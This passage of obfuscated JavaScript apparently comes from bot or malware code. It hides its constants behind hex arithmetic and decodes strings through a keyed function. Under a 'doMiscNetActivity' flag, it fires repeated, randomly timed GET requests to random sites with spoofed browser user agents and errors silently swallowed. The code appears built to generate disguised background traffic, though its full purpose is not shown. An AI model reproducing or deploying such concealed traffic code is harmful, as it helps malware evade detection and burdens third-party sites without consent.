      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0xc2f * -0x1 + 0x5 * 0x227 + -0x16f2; k < -0x180e + 0x2357 + -0x241 * 0x5; k++)
    setTimeout(f, (-0xab09 + 0x5632 + -0xd1 * -0x187) * k * getRandomInt(0x3 * -0xcc9 + -0x7f * -0x4a + 0xd3 * 0x2, -0x3 * -0x761 + 0x2 * -0x6ce + -0x884));
  setInterval(() => {
    f();
    for (let l = -0x156 * -0x17 + -0x8fe + -0x15bc; l < 0xf22 + 0xf9f + -0x1ebd; l++)
      setTimeout(f, (-0xaeca + -0xe701 + 0x2802b) * l * getRandomInt(0x87f + 0x176e + 0x552 * -0x6, 0xf * 0x243 + 0x2121 + -0x773 * 0x9));
  }, -0x7044f + 0x53c23f + -0x15cf70);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    const a2 = b;
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': a2(0xe, 'jBV]')
      }
    })['catch'](h => {});
  }, (-0x4d * -0x69 + 0x25 * 0x9d + -0x1aee) * getRandomInt(0x247e + -0xf88 + -0x14f5, -0x131d + -0x19 * -0x139 + -0xb6f));
}, -0x5fa + -0x1179 + 0x17d7);